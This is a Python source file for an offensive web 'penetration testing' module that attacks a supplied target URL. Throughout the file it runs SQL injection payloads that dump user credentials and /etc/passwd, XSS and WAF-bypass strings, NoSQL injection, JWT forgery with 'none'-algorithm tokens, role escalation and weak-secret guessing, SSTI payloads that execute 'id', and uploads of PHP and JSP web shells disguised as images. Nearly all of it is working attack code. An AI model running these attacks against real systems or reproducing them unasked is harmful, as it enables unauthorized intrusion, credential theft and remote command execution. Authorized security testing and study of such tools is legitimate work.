import requests
import json
import base64
import urllib.parse
import re
import time
import hashlib
import itertools
from bs4 import BeautifulSoup
from typing import Dict, List, Any, Optional
import jwt
import uuid

class AdvancedAttackModule:
    """Advanced attack techniques for comprehensive penetration testing"""
    
    def __init__(self, target_url: str, session: requests.Session = None):
        self.target_url = target_url
        self.session = session or requests.Session()
        self.session.headers.update({
            'User-Agent': 'Advanced-Penetration-Testing-Framework/2.0'
        })
        self.attack_results = []
        
    def advanced_sql_injection_attacks(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Execute advanced SQL injection techniques"""
        results = {
            'union_based': [],
            'time_based': [],
            'boolean_based': [],
            'error_based': [],
            'second_order': [],
            'extracted_data': []
        }
        
        for vuln in vulnerabilities:
            if 'sql injection' in vuln['type'].lower():
                location = vuln['location']
                
                # Union-based SQL injection for data extraction
                union_payloads = [
                    "' UNION SELECT 1,concat(username,':',password),3 FROM users-- -",
                    "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -",
                    "' UNION SELECT 1,load_file('/etc/passwd'),3-- -",
                    "' UNION SELECT 1,@@version,3-- -",
                    "' UNION SELECT 1,database(),user()-- -"
                ]
                
                for payload in union_payloads:
                    try:
                        extracted = self._execute_union_injection(location, payload)
                        if extracted:
                            results['union_based'].append({
                                'payload': payload,
                                'extracted_data': extracted,
                                'location': location
                            })
                            results['extracted_data'].extend(extracted)
                    except:
                        continue
                
                # Time-based blind SQL injection
                time_payloads = [
                    "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND SLEEP(5))-- -",
                    "'; WAITFOR DELAY '00:00:05'-- -",
                    "' OR pg_sleep(5)-- -",
                    "' AND SLEEP(5)-- -"
                ]
                
                for payload in time_payloads:
                    try:
                        is_vulnerable = self._execute_time_based_injection(location, payload)
                        if is_vulnerable:
                            results['time_based'].append({
                                'payload': payload,
                                'location': location,
                                'delay_detected': True
                            })
                    except:
                        continue
                
                # Boolean-based blind SQL injection
                boolean_payloads = [
                    ("' AND 1=1-- -", "' AND 1=2-- -"),
                    ("' AND 'a'='a'-- -", "' AND 'a'='b'-- -"),
                    ("' AND SUBSTRING(database(),1,1)='a'-- -", "' AND SUBSTRING(database(),1,1)='z'-- -")
                ]
                
                for true_payload, false_payload in boolean_payloads:
                    try:
                        is_vulnerable = self._execute_boolean_injection(location, true_payload, false_payload)
                        if is_vulnerable:
                            results['boolean_based'].append({
                                'true_payload': true_payload,
                                'false_payload': false_payload,
                                'location': location
                            })
                    except:
                        continue
        
        return results
    
    def advanced_xss_attacks(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Execute advanced XSS attack techniques"""
        results = {
            'dom_based': [],
            'stored_xss': [],
            'filter_bypass': [],
            'csp_bypass': [],
            'polyglot_payloads': []
        }
        
        # Advanced XSS payloads for filter bypass
        bypass_payloads = [
            # Case variation bypass
            "<ScRiPt>alert('XSS')</ScRiPt>",
            # Encoding bypass
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            # HTML entities bypass
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            # Double encoding bypass
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
            # Unicode bypass
            "<script>alert(\u0027XSS\u0027)</script>",
            # Tag attribute bypass
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe srcdoc='&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'>",
            # JavaScript protocol bypass
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            # Polyglot payload
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e"
        ]
        
        for vuln in vulnerabilities:
            if 'xss' in vuln['type'].lower():
                location = vuln['location']
                
                for payload in bypass_payloads:
                    try:
                        response = self._inject_xss_payload(location, payload)
                        if response and payload in response.text:
                            attack_type = self._classify_xss_bypass(payload)
                            results[attack_type].append({
                                'payload': payload,
                                'location': location,
                                'response_length': len(response.text)
                            })
                    except:
                        continue
        
        return results
    
    def waf_bypass_techniques(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Implement WAF bypass techniques"""
        results = {
            'encoding_bypass': [],
            'case_manipulation': [],
            'comment_insertion': [],
            'parameter_pollution': []
        }
        
        # WAF bypass payloads
        waf_bypass_payloads = [
            # Comment-based bypass
            "/*!UNION*/ /*!SELECT*/ * /*!FROM*/ users",
            "/**/UNION/**/SELECT/**/username,password/**/FROM/**/users",
            # Case manipulation
            "UnIoN SeLeCt UsErNaMe,PaSsWoRd FrOm UsErS",
            # Encoding bypass
            "UNION%20SELECT%20*%20FROM%20users",
            "UNION%0ASELECT%0A*%0AFROM%0Ausers",
            # Space bypass
            "UNION/**/SELECT/**/username,password/**/FROM/**/users",
            "UNION+SELECT+username,password+FROM+users",
            # Function bypass
            "UNION(SELECT(username),password)FROM(users)",
            # Hex encoding
            "0x554e494f4e2053454c454354203120464f52204f5253",
        ]
        
        for vuln in vulnerabilities:
            if 'sql injection' in vuln['type'].lower():
                location = vuln['location']
                
                for payload in waf_bypass_payloads:
                    try:
                        response = self._test_waf_bypass(location, payload)
                        if response:
                            bypass_type = self._classify_waf_bypass(payload)
                            results[bypass_type].append({
                                'payload': payload,
                                'location': location,
                                'status_code': response.status_code
                            })
                    except:
                        continue
        
        return results
    
    def nosql_injection_attacks(self, target_tech: str) -> Dict[str, Any]:
        """Execute NoSQL injection attacks based on detected technology"""
        results = {
            'mongodb_injection': [],
            'couchdb_injection': [],
            'extracted_data': []
        }
        
        if 'couchdb' in target_tech.lower():
            # CouchDB injection payloads
            couchdb_payloads = [
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$regex": ".*"}',
                '{"$where": "this.username"}',
                '{"$exists": true}'
            ]
            
            for payload in couchdb_payloads:
                try:
                    response = self._test_nosql_injection(payload, 'couchdb')
                    if response:
                        results['couchdb_injection'].append({
                            'payload': payload,
                            'response_data': response.text[:500]
                        })
                except:
                    continue
        
        # MongoDB injection payloads
        mongodb_payloads = [
            "admin' || 'a'=='a",
            "'; return db.users.find(); var dummy='",
            "'; return this.username == 'admin' && this.password != ''; var dummy='",
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"$where": "return true"}'
        ]
        
        for payload in mongodb_payloads:
            try:
                response = self._test_nosql_injection(payload, 'mongodb')
                if response:
                    results['mongodb_injection'].append({
                        'payload': payload,
                        'response_data': response.text[:500]
                    })
            except:
                continue
        
        return results
    
    def jwt_attacks(self) -> Dict[str, Any]:
        """Execute JWT-specific attacks"""
        results = {
            'algorithm_confusion': [],
            'weak_secrets': [],
            'token_manipulation': []
        }
        
        # Common JWT endpoints
        jwt_endpoints = [
            '/api/login',
            '/api/auth',
            '/login',
            '/authenticate',
            '/token'
        ]
        
        for endpoint in jwt_endpoints:
            try:
                test_url = urllib.parse.urljoin(self.target_url, endpoint)
                
                # Test with common credentials
                login_data = {
                    'username': 'admin',
                    'password': 'password'
                }
                
                response = self.session.post(test_url, json=login_data, timeout=10)
                
                if response.status_code == 200:
                    # Look for JWT tokens in response
                    jwt_token = self._extract_jwt_token(response)
                    
                    if jwt_token:
                        # Test algorithm confusion
                        confusion_result = self._test_algorithm_confusion(jwt_token)
                        if confusion_result:
                            results['algorithm_confusion'].append(confusion_result)
                        
                        # Test weak secrets
                        weak_secret_result = self._test_weak_jwt_secrets(jwt_token)
                        if weak_secret_result:
                            results['weak_secrets'].append(weak_secret_result)
                        
                        # Test token manipulation
                        manipulation_result = self._test_jwt_manipulation(jwt_token)
                        if manipulation_result:
                            results['token_manipulation'].append(manipulation_result)
                            
            except:
                continue
        
        return results
    
    def server_side_template_injection(self) -> Dict[str, Any]:
        """Test for Server-Side Template Injection vulnerabilities"""
        results = {
            'jinja2_ssti': [],  # Python Flask
            'twig_ssti': [],    # PHP
            'velocity_ssti': [], # Java
            'razor_ssti': []    # ASP.NET
        }
        
        # SSTI payloads for different template engines
        ssti_payloads = {
            'jinja2': [
                "{{7*7}}",
                "{{config.items()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
            ],
            'twig': [
                "{{7*7}}",
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                "{{['id']|filter('system')}}"
            ],
            'velocity': [
                "$7*7",
                "#set($str=$class.forName('java.lang.String'))",
                "#set($runtime=$class.forName('java.lang.Runtime').getRuntime())"
            ],
            'razor': [
                "@(7*7)",
                "@{var result = System.Diagnostics.Process.Start('cmd.exe', '/c whoami');}",
                "@System.Diagnostics.Process.Start('calc.exe')"
            ]
        }
        
        for engine, payloads in ssti_payloads.items():
            for payload in payloads:
                try:
                    # Test in various contexts
                    contexts = [
                        f"?search={payload}",
                        f"?name={payload}",
                        f"?template={payload}"
                    ]
                    
                    for context in contexts:
                        test_url = self.target_url + context
                        response = self.session.get(test_url, timeout=10)
                        
                        # Check for SSTI execution
                        if self._check_ssti_execution(response.text, payload):
                            results[f'{engine}_ssti'].append({
                                'payload': payload,
                                'context': context,
                                'response': response.text[:200]
                            })
                            
                except:
                    continue
        
        return results
    
    def advanced_file_upload_attacks(self) -> Dict[str, Any]:
        """Execute advanced file upload attacks"""
        results = {
            'polyglot_files': [],
            'magic_byte_bypass': [],
            'path_traversal_upload': [],
            'double_extension_bypass': []
        }
        
        # Polyglot file payloads
        polyglot_files = [
            # PHP/GIF polyglot
            ('shell.gif', 'GIF89a;<?php system($_GET["cmd"]); ?>'),
            # PHP/JPEG polyglot  
            ('shell.jpg', '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>'),
            # PHP/PNG polyglot
            ('shell.png', '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>'),
            # ASP/GIF polyglot
            ('shell.gif', 'GIF89a;<%response.write("test")%>'),
            # JSP/GIF polyglot
            ('shell.gif', 'GIF89a;<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>')
        ]
        
        # Path traversal upload attempts
        traversal_names = [
            '../shell.php',
            '..\\shell.asp',
            '../../shell.jsp',
            '../../../shell.php'
        ]
        
        # Double extension bypass
        double_extension_files = [
            'shell.php.jpg',
            'shell.asp.gif',
            'shell.jsp.png',
            'shell.php.pdf'
        ]
        
        # Find upload endpoints
        upload_endpoints = self._discover_upload_endpoints()
        
        for endpoint in upload_endpoints:
            # Test polyglot files
            for filename, content in polyglot_files:
                try:
                    upload_result = self._test_file_upload(endpoint, filename, content)
                    if upload_result:
                        results['polyglot_files'].append({
                            'filename': filename,
                            'endpoint': endpoint,
                            'upload_success': upload_result['success'],
                            'file_url': upload_result.get('file_url')
                        })
                except:
                    continue
            
            # Test path traversal in filenames
            for traversal_name in traversal_names:
                try:
                    upload_result = self._test_file_upload(endpoint, traversal_name, '<?php phpinfo(); ?>')
                    if upload_result:
                        results['path_traversal_upload'].append({
                            'filename': traversal_name,
                            'endpoint': endpoint,
                            'upload_success': upload_result['success']
                        })
                except:
                    continue
        
        return results
    
    def api_security_testing(self) -> Dict[str, Any]:
        """Test API security vulnerabilities"""
        results = {
            'rest_api_enum': [],
            'graphql_introspection': [],
            'api_auth_bypass': [],
            'rate_limiting': []
        }
        
        # Common API endpoints
        api_endpoints = [
            '/api/v1/',
            '/api/v2/',
            '/api/',
            '/rest/',
            '/graphql',
            '/api/users',
            '/api/admin',
            '/api/config'
        ]
        
        for endpoint in api_endpoints:
            try:
                test_url = urllib.parse.urljoin(self.target_url, endpoint)
                
                # Test REST API enumeration
                response = self.session.get(test_url, timeout=10)
                if response.status_code == 200:
                    results['rest_api_enum'].append({
                        'endpoint': endpoint,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'exposed_data': response.text[:300]
                    })
                
                # Test GraphQL introspection
                if 'graphql' in endpoint:
                    introspection_query = {
                        'query': '''
                        query IntrospectionQuery {
                            __schema {
                                queryType { name }
                                mutationType { name }
                                types { name }
                            }
                        }
                        '''
                    }
                    
                    graphql_response = self.session.post(test_url, json=introspection_query, timeout=10)
                    if graphql_response.status_code == 200 and '__schema' in graphql_response.text:
                        results['graphql_introspection'].append({
                            'endpoint': endpoint,
                            'introspection_enabled': True,
                            'schema_data': graphql_response.text[:500]
                        })
                
                # Test rate limiting
                rate_test_results = self._test_rate_limiting(test_url)
                if rate_test_results:
                    results['rate_limiting'].append(rate_test_results)
                    
            except:
                continue
        
        return results
    
    def advanced_information_gathering(self) -> Dict[str, Any]:
        """Advanced information gathering techniques"""
        results = {
            'technology_fingerprinting': [],
            'admin_panel_discovery': [],
            'backup_file_detection': [],
            'version_disclosure': []
        }
        
        # Technology fingerprinting
        try:
            response = self.session.get(self.target_url, timeout=10)
            
            # Check headers for technology indicators
            tech_indicators = {
                'Server': response.headers.get('Server', ''),
                'X-Powered-By': response.headers.get('X-Powered-By', ''),
                'X-AspNet-Version': response.headers.get('X-AspNet-Version', ''),
                'X-Generator': response.headers.get('X-Generator', '')
            }
            
            results['technology_fingerprinting'] = tech_indicators
            
            # Check for version disclosure in content
            version_patterns = [
                r'Apache/([0-9.]+)',
                r'nginx/([0-9.]+)',
                r'PHP/([0-9.]+)',
                r'Microsoft-IIS/([0-9.]+)',
                r'jQuery v([0-9.]+)',
                r'Bootstrap ([0-9.]+)'
            ]
            
            for pattern in version_patterns:
                matches = re.findall(pattern, response.text)
                if matches:
                    results['version_disclosure'].extend(matches)
                    
        except:
            pass
        
        # Admin panel discovery
        admin_paths = [
            '/admin', '/administrator', '/wp-admin', '/admin.php',
            '/admin/', '/control', '/manager', '/admin-panel',
            '/adminpanel', '/admin1', '/admin2', '/admin/admin',
            '/admin/login', '/admin_area', '/bb-admin', '/adminLogin'
        ]
        
        for path in admin_paths:
            try:
                test_url = urllib.parse.urljoin(self.target_url, path)
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code in [200, 401, 403]:
                    results['admin_panel_discovery'].append({
                        'path': path,
                        'status_code': response.status_code,
                        'title': self._extract_page_title(response.text)
                    })
            except:
                continue
        
        # Backup file detection
        backup_extensions = ['.bak', '.backup', '.old', '.orig', '.copy', '.tmp']
        common_files = ['index', 'config', 'database', 'admin', 'login']
        
        for filename in common_files:
            for ext in backup_extensions:
                try:
                    test_url = urllib.parse.urljoin(self.target_url, f'{filename}{ext}')
                    response = self.session.get(test_url, timeout=5)
                    
                    if response.status_code == 200:
                        results['backup_file_detection'].append({
                            'file': f'{filename}{ext}',
                            'size': len(response.text),
                            'content_preview': response.text[:200]
                        })
                except:
                    continue
        
        return results
    
    # Helper methods for attack execution
    def _execute_union_injection(self, location: str, payload: str) -> List[str]:
        """Execute union-based SQL injection and extract data"""
        try:
            if 'URL parameter' in location:
                param_name = location.split(':')[1].strip()
                test_url = f"{self.target_url}?{param_name}={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=10)
            else:
                # Form-based injection would need form data
                return []
            
            if response.status_code == 200:
                # Look for extracted data patterns
                data_patterns = [
                    r'admin:([a-f0-9]{32})',  # MD5 hashes
                    r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)',  # Emails
                    r'root:x:0:0:([^:]*)',  # /etc/passwd entries
                    r'([0-9]+\.[0-9]+\.[0-9]+)',  # Version numbers
                ]
                
                extracted = []
                for pattern in data_patterns:
                    matches = re.findall(pattern, response.text)
                    extracted.extend(matches)
                
                return extracted
        except:
            return []
    
    def _execute_time_based_injection(self, location: str, payload: str) -> bool:
        """Test time-based SQL injection"""
        try:
            if 'URL parameter' in location:
                param_name = location.split(':')[1].strip()
                test_url = f"{self.target_url}?{param_name}={urllib.parse.quote(payload)}"
                
                start_time = time.time()
                response = self.session.get(test_url, timeout=15)
                elapsed_time = time.time() - start_time
                
                # If response took longer than 4 seconds, likely time-based injection
                return elapsed_time > 4
        except:
            return False
        
        return False
    
    def _execute_boolean_injection(self, location: str, true_payload: str, false_payload: str) -> bool:
        """Test boolean-based SQL injection"""
        try:
            if 'URL parameter' in location:
                param_name = location.split(':')[1].strip()
                
                true_url = f"{self.target_url}?{param_name}={urllib.parse.quote(true_payload)}"
                false_url = f"{self.target_url}?{param_name}={urllib.parse.quote(false_payload)}"
                
                true_response = self.session.get(true_url, timeout=10)
                false_response = self.session.get(false_url, timeout=10)
                
                # Different response lengths indicate boolean injection
                return len(true_response.text) != len(false_response.text)
        except:
            return False
        
        return False
    
    def _inject_xss_payload(self, location: str, payload: str) -> Optional[requests.Response]:
        """Inject XSS payload and return response"""
        try:
            if 'URL parameter' in location:
                param_name = location.split(':')[1].strip()
                test_url = f"{self.target_url}?{param_name}={urllib.parse.quote(payload)}"
                return self.session.get(test_url, timeout=10)
        except:
            return None
    
    def _classify_xss_bypass(self, payload: str) -> str:
        """Classify the type of XSS bypass technique"""
        if 'jaVasCript' in payload or 'polyglot' in payload.lower():
            return 'polyglot_payloads'
        elif '%' in payload:
            return 'filter_bypass'
        elif payload.isupper() or payload.islower():
            return 'filter_bypass'
        else:
            return 'filter_bypass'
    
    def _test_waf_bypass(self, location: str, payload: str) -> Optional[requests.Response]:
        """Test WAF bypass payload"""
        try:
            if 'URL parameter' in location:
                param_name = location.split(':')[1].strip()
                test_url = f"{self.target_url}?{param_name}={urllib.parse.quote(payload)}"
                return self.session.get(test_url, timeout=10)
        except:
            return None
    
    def _classify_waf_bypass(self, payload: str) -> str:
        """Classify WAF bypass technique"""
        if '/*' in payload and '*/' in payload:
            return 'comment_insertion'
        elif payload.isupper() or any(c.isupper() for c in payload):
            return 'case_manipulation'
        elif '%' in payload:
            return 'encoding_bypass'
        else:
            return 'encoding_bypass'
    
    def _test_nosql_injection(self, payload: str, db_type: str) -> Optional[requests.Response]:
        """Test NoSQL injection payload"""
        try:
            # Try common NoSQL endpoints
            endpoints = ['/api/login', '/login', '/api/users']
            
            for endpoint in endpoints:
                test_url = urllib.parse.urljoin(self.target_url, endpoint)
                
                if db_type == 'mongodb':
                    # Test as JSON payload
                    try:
                        json_payload = json.loads(payload)
                        response = self.session.post(test_url, json=json_payload, timeout=10)
                        if response.status_code != 404:
                            return response
                    except:
                        pass
                
                # Test as URL parameter
                response = self.session.get(f"{test_url}?username={urllib.parse.quote(payload)}", timeout=10)
                if response.status_code != 404:
                    return response
        except:
            return None
    
    def _extract_jwt_token(self, response: requests.Response) -> Optional[str]:
        """Extract JWT token from response"""
        try:
            # Check JSON response
            if 'application/json' in response.headers.get('Content-Type', ''):
                json_data = response.json()
                for key in ['token', 'access_token', 'jwt', 'authToken']:
                    if key in json_data:
                        return json_data[key]
            
            # Check headers
            auth_header = response.headers.get('Authorization', '')
            if auth_header.startswith('Bearer '):
                return auth_header[7:]
            
            # Check cookies
            for cookie in response.cookies:
                if 'token' in cookie.name.lower() or 'jwt' in cookie.name.lower():
                    return cookie.value
                    
        except:
            pass
        
        return None
    
    def _test_algorithm_confusion(self, jwt_token: str) -> Optional[Dict]:
        """Test JWT algorithm confusion attack"""
        try:
            # Decode without verification to get payload
            decoded = jwt.decode(jwt_token, options={"verify_signature": False})
            
            # Create new token with "none" algorithm
            none_token = jwt.encode(decoded, "", algorithm="none")
            
            # Test the manipulated token
            test_response = self._test_jwt_token(none_token)
            if test_response and test_response.status_code == 200:
                return {
                    'attack_type': 'Algorithm Confusion',
                    'original_token': jwt_token[:50] + '...',
                    'manipulated_token': none_token,
                    'success': True
                }
        except:
            pass
        
        return None
    
    def _test_weak_jwt_secrets(self, jwt_token: str) -> Optional[Dict]:
        """Test for weak JWT secrets"""
        weak_secrets = [
            'secret', 'password', '123456', 'admin', 'test',
            'key', 'jwt', 'token', 'auth', 'default'
        ]
        
        for secret in weak_secrets:
            try:
                # Try to verify with weak secret
                decoded = jwt.decode(jwt_token, secret, algorithms=["HS256"])
                return {
                    'attack_type': 'Weak Secret',
                    'secret_found': secret,
                    'decoded_payload': decoded,
                    'success': True
                }
            except:
                continue
        
        return None
    
    def _test_jwt_manipulation(self, jwt_token: str) -> Optional[Dict]:
        """Test JWT payload manipulation"""
        try:
            # Decode without verification
            decoded = jwt.decode(jwt_token, options={"verify_signature": False})
            
            # Manipulate common fields
            manipulations = []
            
            if 'role' in decoded:
                original_role = decoded['role']
                decoded['role'] = 'admin'
                manipulations.append(f"role: {original_role} -> admin")
            
            if 'admin' in decoded:
                decoded['admin'] = True
                manipulations.append("admin: False -> True")
            
            if 'user_id' in decoded:
                original_id = decoded['user_id']
                decoded['user_id'] = 1
                manipulations.append(f"user_id: {original_id} -> 1")
            
            if manipulations:
                # Create new token (this would normally fail verification)
                manipulated_token = jwt.encode(decoded, "", algorithm="none")
                
                return {
                    'attack_type': 'Payload Manipulation',
                    'manipulations': manipulations,
                    'manipulated_token': manipulated_token,
                    'success': True
                }
        except:
            pass
        
        return None
    
    def _test_jwt_token(self, token: str) -> Optional[requests.Response]:
        """Test JWT token against protected endpoints"""
        headers = {'Authorization': f'Bearer {token}'}
        
        protected_endpoints = ['/api/admin', '/admin', '/profile', '/dashboard']
        
        for endpoint in protected_endpoints:
            try:
                test_url = urllib.parse.urljoin(self.target_url, endpoint)
                response = self.session.get(test_url, headers=headers, timeout=10)
                if response.status_code in [200, 403]:  # Any meaningful response
                    return response
            except:
                continue
        
        return None
    
    def _check_ssti_execution(self, response_text: str, payload: str) -> bool:
        """Check if SSTI payload was executed"""
        # Check for mathematical evaluation
        if '7*7' in payload and '49' in response_text:
            return True
        
        # Check for other SSTI indicators
        ssti_indicators = [
            'config', 'application', 'globals', '__builtins__',
            'java.lang', 'System.Diagnostics', 'Runtime.getRuntime'
        ]
        
        return any(indicator in response_text for indicator in ssti_indicators)
    
    def _discover_upload_endpoints(self) -> List[str]:
        """Discover file upload endpoints"""
        upload_paths = [
            '/upload', '/upload.php', '/upload.asp', '/upload.aspx',
            '/fileupload', '/file-upload', '/files/upload',
            '/admin/upload', '/user/upload'
        ]
        
        discovered = []
        for path in upload_paths:
            try:
                test_url = urllib.parse.urljoin(self.target_url, path)
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code in [200, 405]:  # 405 = Method Not Allowed (POST required)
                    discovered.append(test_url)
            except:
                continue
        
        return discovered
    
    def _test_file_upload(self, endpoint: str, filename: str, content: str) -> Optional[Dict]:
        """Test file upload functionality"""
        try:
            files = {'file': (filename, content, 'text/plain')}
            response = self.session.post(endpoint, files=files, timeout=10)
            
            if response.status_code == 200:
                # Look for upload success indicators
                if any(indicator in response.text.lower() for indicator in 
                       ['uploaded', 'success', 'file saved', filename.lower()]):
                    return {
                        'success': True,
                        'response_code': response.status_code,
                        'file_url': self._extract_file_url(response.text, filename)
                    }
        except:
            pass
        
        return None
    
    def _extract_file_url(self, response_text: str, filename: str) -> Optional[str]:
        """Extract uploaded file URL from response"""
        # Look for file URL patterns
        url_patterns = [
            rf'(\/uploads?\/{re.escape(filename)})',
            rf'(\/files?\/{re.escape(filename)})',
            rf'(\/tmp\/{re.escape(filename)})'
        ]
        
        for pattern in url_patterns:
            match = re.search(pattern, response_text)
            if match:
                return urllib.parse.urljoin(self.target_url, match.group(1))
        
        return None
    
    def _test_rate_limiting(self, url: str) -> Optional[Dict]:
        """Test for rate limiting implementation"""
        try:
            # Send multiple requests quickly
            responses = []
            for i in range(10):
                response = self.session.get(url, timeout=5)
                responses.append(response.status_code)
                time.sleep(0.1)  # Small delay
            
            # Check for rate limiting responses
            rate_limited = any(code == 429 for code in responses)  # 429 = Too Many Requests
            
            return {
                'endpoint': url,
                'rate_limited': rate_limited,
                'response_codes': responses,
                'requests_sent': len(responses)
            }
        except:
            return None
    
    def _extract_page_title(self, html_content: str) -> str:
        """Extract page title from HTML"""
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            title_tag = soup.find('title')
            return title_tag.get_text().strip() if title_tag else 'No title'
        except:
            return 'Unknown'